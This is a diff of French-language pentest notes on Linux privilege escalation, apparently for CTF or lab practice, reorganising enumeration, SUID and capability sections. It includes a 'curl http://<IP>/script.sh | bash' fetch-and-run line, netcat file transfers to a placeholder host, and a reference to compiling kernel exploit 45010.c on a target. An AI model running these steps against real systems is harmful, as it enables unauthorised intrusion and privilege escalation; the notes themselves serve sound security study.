@@ -1,21 +1,12 @@
 # Linux
 
-### Commandes (OLD)
+## Commandes utiles
+
+**Trouver un flag**
 
 ```bash
-id
-sudo -l
-crontab -l
-env
-find / -perm -u=s -type f 2>/dev/null
-find / -perm /4000 2>/dev/null
-getcap -r / 2>/dev/null
-ps aux
-ss -tln
-netstat -taupen
+find / -name "flag.txt" 2>/dev/null
 ```
-
-## Commandes utiles
 
 **Transfert de fichiers avec nc**
 
@@ -27,6 +18,12 @@ nc -l -p 4444 -q 1 > something.zip < /dev/null
 cat something.zip | netcat <IP> 4444
 ```
 
+**Télécharger un fichier depuis HTTP**
+```bash
+wget http://<ip>/script.exe
+curl -O http://<ip>/script.exe
+```
+
 **Exécuter un script Bash**
 
 ```bash
@@ -34,17 +31,13 @@ cat script.sh | bash
 curl http://<IP>/script.sh | bash
 ```
 
-**Trouver des fichiers avec permissions spéciales**
+**Extraire le contenu lisible d'un binaire**
 
 ```bash
-# regarder les binaires liés à un group
-find / -group <GROUP> 2>/dev/null
-
-# infos sur un fichier (looking for setuid, suid)
-ls -la <FILE_PATH> && file <FILE_PATH>
+strings /usr/bin/passwd_flag
 ```
 
-## Enumerating Linux
+## Enumération
 
 ### Enumération manuelle
 
@@ -100,6 +93,8 @@ route
 
 ```bash
 ss -anp
+ss -tln
+netstat -taupen
 ```
 
 **Règles firewall**
@@ -140,6 +135,16 @@ rpm -qa
 find / -writable -type d 2>/dev/null
 ```
 
+**Trouver des fichiers avec permissions spéciales**
+
+```bash
+# regarder les binaires liés à un group
+find / -group <GROUP> 2>/dev/null
+
+# infos sur un fichier (looking for setuid, suid)
+ls -la <FILE_PATH> && file <FILE_PATH>
+```
+
 **Systèmes de fichiers montés et partitions**
 
 ```bash
@@ -154,22 +159,6 @@ lsblk
 lsmod
 /sbin/modinfo <module>
 ```
-
-**Binaires avec bit SUID**
-
-Si le SUID est positionné sur un binaire appartenant à root, n'importe quel utilisateur peut l'exécuter avec les droits root.
-
-```bash
-find / -perm -u=s -type f 2>/dev/null
-```
-
-Référence pour l'exploitation : [GTFOBins](https://gtfobins.github.io/), [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
-
-```bash
-# Extraire le contenu lisible d'un binaire
-strings /usr/bin/passwd_flag
-```
-
 ### Enumération automatique
 
 **linPEAS**
@@ -350,10 +339,13 @@ id
 
 ### Abusing SUID binaries 
 
+Si le SUID est positionné sur un binaire appartenant à root, n'importe quel utilisateur peut l'exécuter avec les droits root.
+
 **Trouver les binaires avec le bit SUID**
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
+find / -perm /4000 2>/dev/null
 
 # Inspecter les UIDs d'un processus (real / effective)
 ps aux | grep passwd
@@ -361,7 +353,7 @@ grep Uid /proc/<pid>/status
 ```
 
 Pour l'exploitation des binaires SUID, chercher le binaire sur [GTFOBins](https://gtfobins.github.io/) → onglet **SUID**.
-
+Référence pour l'exploitation : [GTFOBins](https://gtfobins.github.io/), [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
 ### Abusing binaries capabilities
 
 **Lister les capabilities des binaires**
@@ -417,7 +409,7 @@ head 45010.c -n 20
 
 Les premières lignes contiennent en général les instructions de compilation.
 
-**Transférer le source sur la cible et compiler**
+**Transférer le code source sur la cible et compiler**
 
 ```bash
 # Kali
